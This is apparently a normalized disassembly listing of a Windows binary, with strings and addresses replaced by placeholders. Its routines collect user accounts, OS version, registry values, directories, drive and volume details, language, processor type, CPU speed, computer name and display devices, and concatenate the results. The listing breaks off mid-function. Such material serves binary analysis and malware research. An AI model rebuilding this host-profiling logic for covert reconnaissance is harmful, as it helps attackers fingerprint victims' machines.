mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
sub ebx 0x4
mov ebx [ ebx ]
dec eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ rw-data ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
test eax eax
je r-xdata
mov eax rw-data
mov ecx [ rw-data ]
mov edx r-xdata
call sub_405170
cmp eax 0x2
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x3c ]
call sub_45e960
push [ ebp - 0x3c ]
lea edx [ ebp - 0x40 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x40 ]
lea eax [ ebp - 0x44 ]
call sub_45e504
push [ ebp - 0x44 ]
push [ rw-data ]
push r-xdata
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x48 ]
call sub_40987c
push [ ebp - 0x48 ]
push r-xdata
mov eax rw-data
mov edx 0x7
call sub_4051e4
lea ecx [ ebp - 0x4c ]
mov edx 0x10
mov al 0x2d
call sub_405610
mov ecx [ ebp - 0x4c ]
xor edx edx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
lea edx [ ebp - 0x50 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x50 ]
mov edx [ rw-data ]
call sub_45e5e0
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax rw-data
mov ecx [ rw-data ]
mov edx r-xdata
call sub_405170
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_45fbe4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45fcab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404e44
xor eax eax
push ebp
push sub_45fc58
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov [ ebp - 0x10 ] eax
mov edx 0x80000001
mov eax [ ebp - 0x10 ]
call sub_420e5c
lea edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_420ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fcb2
lea eax [ ebp - 0x14 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_45fd0c
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45fe97
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
push [ ebp - 0x4 ]
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
xor edx edx
push ebp
push sub_45fe0e
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
push eax
call NetApiBufferFree
cmp edi 0xea
je r-xdata
inc esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x1
push 0x0
call NetUserEnum
mov edi eax
mov ebx [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx ]
call sub_405f3c
push [ ebp - 0x20 ]
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x24 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x14 ]
call sub_405f3c
push [ ebp - 0x28 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x6
call sub_4051e4
add ebx 0x20
dec esi
jne r-xdata
push [ ebp - 0x4 ]
push 0x0
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2c ]
lea eax [ ebp - 0x30 ]
call sub_45fbe4
push [ ebp - 0x30 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4051e4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe9e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_45ff20
push ebp
mov ebp esp
mov ecx 0x1e
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4602de
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404e44
xor eax eax
push ebp
push sub_45ffc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xa0 ] 0x94
lea eax [ ebp - 0xa0 ]
push eax
call GetVersionExA
mov eax [ ebp - 0x90 ]
sub eax 0x1
jb r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
dec eax
je r-xdata
xor eax eax
push ebp
push sub_45fffb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0x20119
mov dl 0x1
mov eax [ r-xdata ]
call sub_420dc4
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4602a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_420e5c
cmp [ ebp - 0x90 ] 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45ec84
lea edx [ ebp - 0xa8 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xa8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_420ec4
lea edx [ ebp - 0xa4 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xa4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_420ec4
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xac ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xac ]
lea edx [ ebp - 0xb4 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xb4 ]
lea ecx [ ebp - 0xb0 ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xb0 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xb8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xb8 ]
lea edx [ ebp - 0xc0 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xc0 ]
lea ecx [ ebp - 0xbc ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xbc ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xc4 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xc4 ]
lea edx [ ebp - 0xcc ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xcc ]
lea ecx [ ebp - 0xc8 ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xc8 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xd0 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xd0 ]
lea edx [ ebp - 0xd8 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xd8 ]
lea ecx [ ebp - 0xd4 ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xd4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xdc ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xdc ]
lea edx [ ebp - 0xe4 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe0 ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xe0 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0xe8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xe8 ]
lea edx [ ebp - 0xf0 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0xf0 ]
lea ecx [ ebp - 0xec ]
mov eax [ ebp - 0xc ]
call sub_421600
push [ ebp - 0xec ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
mov eax [ ebp - 0xc ]
call sub_420e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602aa
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_4602aa
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40512c
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602e5
lea eax [ ebp - 0xf0 ]
mov edx 0x14
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4605f8
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x9c ] edx
mov [ ebp - 0xa0 ] edx
mov [ ebp - 0xa4 ] edx
mov [ ebp - 0xa8 ] edx
mov [ ebp - 0xac ] edx
mov edi eax
xor eax eax
push ebp
push sub_46071c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4606f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x98 ] 0x94
lea eax [ ebp - 0x98 ]
push eax
call GetVersionExA
movzx ebx [ ebp - 0x94 ]
movzx eax [ ebp - 0x90 ]
mov [ ebp - 0x1 ] al
movzx esi [ ebp - 0x8c ]
lea edx [ ebp - 0x9c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x9c ]
lea edx [ ebp - 0xa0 ]
movzx eax bl
call sub_40987c
push [ ebp - 0xa0 ]
push r-xdata
lea edx [ ebp - 0xa4 ]
movzx eax [ ebp - 0x1 ]
call sub_40987c
push [ ebp - 0xa4 ]
lea edx [ ebp - 0xa8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0xa8 ]
lea edx [ ebp - 0xac ]
movzx eax si
call sub_40987c
push [ ebp - 0xac ]
mov eax edi
mov edx 0x6
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460723
lea eax [ ebp - 0xac ]
mov edx 0x5
call sub_404e68
retn
sub_460778
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4607ff
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4607da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_45ff20
push [ rw-data ]
lea eax [ ebp - 0x8 ]
call sub_4605f8
push [ ebp - 0x8 ]
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0x4
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460806
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_460828
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov esi r-xdata
lea edi [ ebp - 0x109 ]
mov ecx 0x41
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
push ebp
push sub_460873
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x105
lea eax [ ebp - 0x109 ]
push eax
call GetWindowsDirectoryA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x109 ]
mov ecx 0x105
call sub_4050b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4609b4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov esi r-xdata
lea edi [ ebp - 0x109 ]
mov ecx 0x41
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
push ebp
push sub_4609ff
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x105
lea eax [ ebp - 0x109 ]
push eax
call GetSystemDirectoryA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x109 ]
mov ecx 0x105
call sub_4050b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460b40
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx rw-data
xor eax eax
push ebp
push sub_460d00
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_460cdb
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebx ]
push 0x0
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
call sub_460828
push [ ebp - 0xc ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
call sub_4609b4
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
call sub_45e8a8
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
call sub_40a2c8
push [ ebp - 0x24 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
push 0x0
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x28 ]
lea edx [ ebp - 0x2c ]
xor eax eax
call sub_403198
push [ ebp - 0x2c ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d07
lea eax [ ebp - 0x2c ]
mov edx 0xb
call sub_404e68
retn
sub_460db8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_460e00
push [ fs : edx ]
mov [ fs : edx ] esp
call GetSystemDefaultLangID
push 0x64
lea edx [ ebp - 0x69 ]
push edx
movzx eax ax
push eax
call VerLanguageNameA
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x69 ]
mov ecx 0x65
call sub_4050b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460e1c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_460efd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] 0x3a
mov [ ebp - 0xb ] 0x5c
mov [ ebp - 0xa ] 0x0
lea esi [ ebp - 0xd ]
xor eax eax
push ebp
push sub_460ed3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40a2c8
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40502c
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x14 ]
call sub_40a2d4
test al al
je r-xdata
xor ebx ebx
mov [ edi ] 0xffffffff
mov [ edi + 0x4 ] 0xffffffff
mov eax [ ebp - 0x8 ]
mov [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0xffffffff
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
call sub_40a2d4
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460f04
lea eax [ ebp - 0x14 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_460f1c
push ebp
mov ebp esp
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46124f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
call sub_404e44
xor eax eax
push ebp
push sub_46120a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx 0x12c
call sub_4055ac
mov eax [ ebp - 0xc ]
call sub_405324
push eax
push 0x12c
call GetLogicalDriveStringsA
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405468
mov ebx eax
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405384
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
sub ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
cmp esi 0x3
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461256
lea eax [ ebp - 0x54 ]
mov edx 0xb
call sub_404e68
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call GetDriveTypeA
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x2
jl r-xdata
mov edi [ ebp - 0xc ]
test edi edi
je r-xdata
cmp [ ebp - 0x1c ] 0x6
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x1 ]
mov ecx edi
mov eax [ ebp - 0xc ]
call sub_405384
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405468
mov ebx eax
test ebx ebx
jg r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40512c
mov eax [ ebp - 0x1c ]
cmp eax 0x6
ja r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call GetVolumeInformationA
mov eax [ ebp - 0x20 ]
xor edx edx
push edx
push eax
lea edx [ ebp - 0x10 ]
mov eax 0x8
call sub_4099b8
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
call sub_460e1c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_460ff9 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x54 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x54 ]
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x5
call sub_4051e4
push [ ebp - 0x8 ]
lea edx [ ebp - 0x40 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x40 ]
push [ ebp - 0x10 ]
lea edx [ ebp - 0x44 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x44 ]
mov eax [ ebp + 0x8 ]
fild [ eax - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
push eax
xor ecx ecx
mov edx 0x14
mov al 0x3
call sub_40b924
push [ ebp - 0x48 ]
lea edx [ ebp - 0x4c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x4c ]
mov eax [ ebp + 0x8 ]
fild [ eax - 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
push eax
xor ecx ecx
mov edx 0x14
mov al 0x3
call sub_40b924
push [ ebp - 0x50 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x9
call sub_4051e4
jmp r-xdata
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_40512c
sub_46135c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4613ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x28 ]
push eax
call GetSystemInfo
movzx ebx [ ebp - 0x8 ]
mov eax ebx
sub ax 0x3
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
dec ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
dec ax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
dec ax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
movzx eax bx
call sub_40987c
sub_461468
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_461517
push [ fs : eax ]
mov [ fs : eax ] esp
call GetCurrentProcess
push eax
call GetPriorityClass
mov ebx eax
call GetCurrentThread
push eax
call GetThreadPriority
mov esi eax
push 0x100
call GetCurrentProcess
push eax
call SetPriorityClass
push 0xf
call GetCurrentThread
push eax
call SetThreadPriority
push 0xa
call Sleep
rdtsc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
push 0x1f4
call Sleep
rdtsc
sub eax [ ebp - 0x4 ]
sbb edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
push esi
call GetCurrentThread
push eax
call SetThreadPriority
push ebx
call GetCurrentProcess
push eax
call SetPriorityClass
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461538
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xff
xor eax eax
push ebp
push sub_461588
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_402d28
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
call GetComputerNameA
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40503c
mov eax ebx
call sub_402d44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4615a4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461603
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xac ] 0xa8
xor esi esi
xor ebx ebx
jmp r-xdata
push esi
lea eax [ ebp - 0xac ]
push eax
push ebx
push 0x0
call EnumDisplayDevicesA
test eax eax
jne r-xdata
inc ebx
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0xa8 ]
mov ecx 0x20
call sub_4050b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46161c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx rw-data
xor eax eax
push ebp
push sub_46180f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4617ea
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebx ]
push 0x0
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
call sub_460db8
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
call sub_46135c
push [ ebp - 0x24 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x28 ]
call sub_461468
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x2c ]
call sub_40b8c4
push [ ebp - 0x2c ]
push r-xdata
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x6
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x30 ]
mov eax r-xdata
